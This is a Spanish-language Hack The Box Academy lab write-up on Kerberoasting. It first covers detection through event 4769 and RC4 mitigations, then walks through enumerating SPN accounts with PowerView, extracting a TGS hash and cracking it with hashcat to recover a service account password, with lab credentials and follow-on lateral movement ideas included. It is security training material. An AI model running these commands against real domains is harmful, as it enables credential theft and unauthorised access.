Las solicitudes de Kerberoasting solicitan tickets TGS de Kerberos con cifrado RC4, que no deberían ser la mayoría de la actividad de Kerberos dentro de un dominio. Cuando se produce Kerberoasting en el entorno, veremos una cantidad anormal de solicitudes `TGS-REQ` y respuestas `TGS-REP`, lo que indica el uso de herramientas de Kerberoasting automatizadas. Los controladores de dominio se pueden configurar para registrar solicitudes de tickets TGS de Kerberos seleccionando [Auditar operaciones de tickets de servicio de Kerberos](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) dentro de la Política de grupo.

![imagen](https://academy.hackthebox.com/storage/modules/143/kerb_audit.png)

Al hacerlo, se generarán dos identificadores de eventos independientes: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769) : se solicitó un ticket de servicio Kerberos y [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770) : se renovó un ticket de servicio Kerberos. Entre 10 y 20 solicitudes TGS de Kerberos para una cuenta determinada pueden considerarse normales en un entorno determinado. Una gran cantidad de identificadores de eventos 4769 de una cuenta en un período breve puede indicar un ataque.

A continuación, podemos ver un ejemplo de un ataque Kerberos que se está registrando. Vemos que se registran muchos eventos con ID 4769 en sucesión, lo que parece ser un comportamiento anómalo. Al hacer clic en uno, podemos ver que el usuario `htb-student` (atacante) solicitó un ticket de servicio Kerberos para la cuenta `sqldev` (objetivo). También podemos ver que el tipo de cifrado del ticket es `0x17`, que es el valor hexadecimal de 23 ( `DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256`), lo que significa que el ticket solicitado era RC4, por lo que si la contraseña era débil, hay una buena posibilidad de que el atacante pueda descifrarla y obtener el control de la cuenta `sqldev`.

![imagen](https://academy.hackthebox.com/storage/modules/143/4769.png)

Otras medidas de solución incluyen restringir el uso del algoritmo RC4, en particular para las solicitudes de Kerberos por parte de las cuentas de servicio. Esto debe probarse para asegurarse de que nada falle dentro del entorno. Además, los administradores de dominio y otras cuentas con privilegios elevados no deben usarse como cuentas SPN (si las cuentas SPN deben existir en el entorno).

Esta excelente [publicación](https://adsecurity.org/?p=3458) de Sean Metcalf destaca algunas estrategias de mitigación y detección para Kerberoasting.

***

## <mark style="color:purple;">Caso práctico</mark>

```
RDP a 10.129.213.232 (ACADEMY-EA-MS01)
Usuario " htb-student "
Contraseña " Academy_student_AD! "
```

### Pregunta 1

¿Cuál es el nombre de la cuenta de servicio con el SPN `vmware/inlanefreight.local`?

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
certsvc
krbtgt
damundsen
sqldev
sqlprod
sqlqa
SAPService
solarwindsmonitor
testspn
testspn2
svc_vmwaresso  # Parece la cuenta objetivo
```

Todo apunta a que la cuenta `svc_vmwaresso` es la cuenta objetivo, por lo que vamos a solititar un ticker y crackearlo

### Pregunta 2

Descifra la contraseña de esta cuenta y envíala como respuesta.

```powershell
PS C:\Tools> Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat


SamAccountName       : svc_vmwaresso
DistinguishedName    : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : vmware/inlanefreight.local
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$C489198E431F8DBE349
                       2B9C3E22ECFA5$FA2AD0F0BF089B463C17EED7E3F2FDA2F2A00B38A0D890B9F15DDAB3C0B91A6F353E8C9FCD4476D9
                       163F3C87B24F3D32DDA2F23921FDBBD1271E20971A04E81D7A76B011DF94817493E874262FCA963AC17060F8815456
                       EBD1F515EC1B4E189480DACBEE53B7BE38917F5A4A1A665951F195C88CEA95E3FA085428831EC1982290D1FF01AEA2
                       9B1B0F57D6F4BAE9F830803C5AD1B77B10AB330BBF7ABA31BC216B3D0AF8F4E2C7205B07C5CB18AF94E7A1B502B8BD
                       E1256833D6073345B557E1A8B13F30A155D4546B88BD15A17280896AD39F173EB61939DF27C501FEE7EA1CC30AE8D9
                       AB9DA083BBDFDDAAA57D4570C429008BCC46E8E483E0996C7B9D8CDCCD8F97032A0BE42B56EE4865772E6ED91482B4
                       92EC2A65870B56BEAB155C8925FB2DD96BB3E7D801D01BA7DE25661225DE1C9DC1F5172590841C506DA6A22D606A51
                       BFC6DD1535A6686DDCD4B5833D446FD183B22AF8293E62960B1DE08B6236E6046356C3CC1DE57728D6113F12D3A2E6
                       7C9E6AB2FEE9F5169D525A8598627F6DFF2AA492132A805AAE794417008E4594219CD49131120EB0628C63CE0E344F
                       531742C0E150E1FE2DA293CCA249005FE3D369C94D4B0123CF69379ADEA6A633AA68E2D883A14F5F9F80223E52EEEE
                       7617E3821309BC41002227396C4135397D83355BDA5E40522313B070D799F7AECF537CA8A2C08B077BF87BB435CD4E
                       D8DCB8BF02ED02D9A38286EA02E34AD7246C9219059761D81CD50B5BBEA8EF979984C48BC2EC33A3A3E80564DB8D15
                       212DEECEE52400B0BEEB4494B176F4E267C4A4BA89502EF8405B49C9844612280EE2189CC85B12F25AA86981401B76
                       E7D2A2A1B551BFC0129DA8FB8D9E1366B9498358488CFC431D8BEBBDFA6A63E3989F21847D9196D6CC0146294A499E
                       2B58A34E813533C7E072F0CCE883396F55A796A1AF0384D587CA8419ECC2B2D0490972DBF223C86473F526B0A937B6
                       3CB81CC75220F8AF1B3B000938A3A3C92C6E40F1BD96CCBB447FB18DF31FC98251040213377308D0436F99E0F7F47A
                       A8C8AB94B11A81C4229A3D7D656C1B85B2A1C409492FEE0D9AE269D0B855024B53990B0ADCF85AA0592A7BF7F2D9A6
                       E4E908AC8CFB4A274FC87AF2DE157DB771D7156C39D038C8BCA8BED572DD4235D1CC40416BD1C5DCB2D1A406A1847E
                       1B1BD631647E7D705DC2FF2E5DFEDA8FA05158BE6AA9A1E7C06F5D5A21B22C02DAAAD9F691586397A7D2E7FC5D1C5C
                       F304FB4D6A31367839051F65B7C90AB57D8579916AF7F1E1638BB23F0CB53295E6F74CC8C428D0F5860DD31EB47897
                       38ACE6108C0A66C51C16E28296EF50CDC2C8A7111B056FB383379E40B003CE61D90B023219C8BEB47064B889315A9B
                       942F072649565269319EED4D5DA428ABBE91DAF1787D861514DA851197B2F097EAB9E8FF7F0373E61D937ED416462F
                       42201C5381137FC7E8642495619D3B7E29EE0A1984E73BC7B8C6BD56D42C4A06209FB9A1BDDA0A6C23D23E7B76BA26
                       F354D16638450EBB276B67329A5B524B2A4CA7767DF4C5D65A11F0CA2C2D07906843CE8587BA037C890AC64EDF20F5
                       FAD02C68D3515C83C20E48ECB62933D0536288E042562CFDFEAF8AA17CAD2B1569DC14183517F34B5E543B3832D9E0
                       FC4629E24BFE243522
```

Guardamos el hash en un archivo `vmwaresso_hashcat` y vamos a eliminar todos los espacios y saltos de línea con el siguiente comando:

#### Preparación del Blob

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ tr -d '[:space:]' < vmwaresso_hashcat > vmwaresso_hash    

afsh4ck@kali$ 
cat vmwaresso_hash   
$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$C489198E431F8DBE3492B9C3E22ECFA5$FA2AD0F0BF089B463C17EED7E3F2FDA2F2A00B38A0D890B9F15DDAB3C0B91A6F353E8C9FCD4476D9163F3C87B24F3D32DDA2F23921FDBBD1271E20971A04E81D7A76B011DF94817493E874262FCA963AC17060F8815456EBD1F515EC1B4E189480DACBEE53B7BE38917F5A4A1A665951F195C88CEA95E3FA085428831EC1982290D1FF01AEA29B1B0F57D6F4BAE9F830803C5AD1B77B10AB330BBF7ABA31BC216B3D0AF8F4E2C7205B07C5CB18AF94E7A1B502B8BDE1256833D6073345B557E1A8B13F30A155D4546B88BD15A17280896AD39F173EB61939DF27C501FEE7EA1CC30AE8D9AB9DA083BBDFDDAAA57D4570C429008BCC46E8E483E0996C7B9D8CDCCD8F97032A0BE42B56EE4865772E6ED91482B492EC2A65870B56BEAB155C8925FB2DD96BB3E7D801D01BA7DE25661225DE1C9DC1F5172590841C506DA6A22D606A51BFC6DD1535A6686DDCD4B5833D446FD183B22AF8293E62960B1DE08B6236E6046356C3CC1DE57728D6113F12D3A2E67C9E6AB2FEE9F5169D525A8598627F6DFF2AA492132A805AAE794417008E4594219CD49131120EB0628C63CE0E344F531742C0E150E1FE2DA293CCA249005FE3D369C94D4B0123CF69379ADEA6A633AA68E2D883A14F5F9F80223E52EEEE7617E3821309BC41002227396C4135397D83355BDA5E40522313B070D799F7AECF537CA8A2C08B077BF87BB435CD4ED8DCB8BF02ED02D9A38286EA02E34AD7246C9219059761D81CD50B5BBEA8EF979984C48BC2EC33A3A3E80564DB8D15212DEECEE52400B0BEEB4494B176F4E267C4A4BA89502EF8405B49C9844612280EE2189CC85B12F25AA86981401B76E7D2A2A1B551BFC0129DA8FB8D9E1366B9498358488CFC431D8BEBBDFA6A63E3989F21847D9196D6CC0146294A499E2B58A34E813533C7E072F0CCE883396F55A796A1AF0384D587CA8419ECC2B2D0490972DBF223C86473F526B0A937B63CB81CC75220F8AF1B3B000938A3A3C92C6E40F1BD96CCBB447FB18DF31FC98251040213377308D0436F99E0F7F47AA8C8AB94B11A81C4229A3D7D656C1B85B2A1C409492FEE0D9AE269D0B855024B53990B0ADCF85AA0592A7BF7F2D9A6E4E908AC8CFB4A274FC87AF2DE157DB771D7156C39D038C8BCA8BED572DD4235D1CC40416BD1C5DCB2D1A406A1847E1B1BD631647E7D705DC2FF2E5DFEDA8FA05158BE6AA9A1E7C06F5D5A21B22C02DAAAD9F691586397A7D2E7FC5D1C5CF304FB4D6A31367839051F65B7C90AB57D8579916AF7F1E1638BB23F0CB53295E6F74CC8C428D0F5860DD31EB4789738ACE6108C0A66C51C16E28296EF50CDC2C8A7111B056FB383379E40B003CE61D90B023219C8BEB47064B889315A9B942F072649565269319EED4D5DA428ABBE91DAF1787D861514DA851197B2F097EAB9E8FF7F0373E61D937ED416462F42201C5381137FC7E8642495619D3B7E29EE0A1984E73BC7B8C6BD56D42C4A06209FB9A1BDDA0A6C23D23E7B76BA26F354D16638450EBB276B67329A5B524B2A4CA7767DF4C5D65A11F0CA2C2D07906843CE8587BA037C890AC64EDF20F5FAD02C68D3515C83C20E48ECB62933D0536288E042562CFDFEAF8AA17CAD2B1569DC14183517F34B5E543B3832D9E0FC4629E24BFE243522%  
```

{% endcode %}

#### Cracking con Hashcat

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 vmwaresso_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 2137/4338 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

<SNIP>15a9b942f072649565269319eed4d5da428abbe91daf1787d861514da851197b2f097eab9e8ff7f0373e61d937ed416462f42201c5381137fc7e8642495619d3b7e29ee0a1984e73bc7b8c6bd56d42c4a06209fb9a1bdda0a6c23d23e7b76ba26f354d16638450ebb276b67329a5b524b2a4ca7767df4c5d65a11f0ca2c2d07906843ce8587ba037c890ac64edf20f5fad02c68d3515c83c20e48ecb62933d0536288e042562cfdfeaf8aa17cad2b1569dc14183517f34b5e543b3832d9e0fc4629e24bfe243522:Virtual01
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmwa...243522
```

{% endcode %}

Buum! Conseguimos crackear el hash y obtenemos la contraseña en plano: `Virtual01` 🏆

***

## <mark style="color:purple;">Hacia adelante</mark>

Ahora que tenemos un conjunto de credenciales (con suerte, privilegiadas), podemos pasar a ver dónde podemos usarlas. Es posible que podamos:

* Acceder a un host a través de RDP o WinRM como usuario local o administrador local
* Autenticarse en un host remoto como administrador usando una herramienta como PsExec
* Obtener acceso a un recurso compartido de archivos confidencial
* Obtenga acceso MSSQL a un host como usuario DBA, que luego se puede aprovechar para aumentar los privilegios

Independientemente de nuestro acceso, también querremos profundizar en el dominio para buscar otras fallas y configuraciones incorrectas que puedan ayudarnos a ampliar nuestro acceso y agregar a nuestro informe para brindar más valor a nuestros clientes.
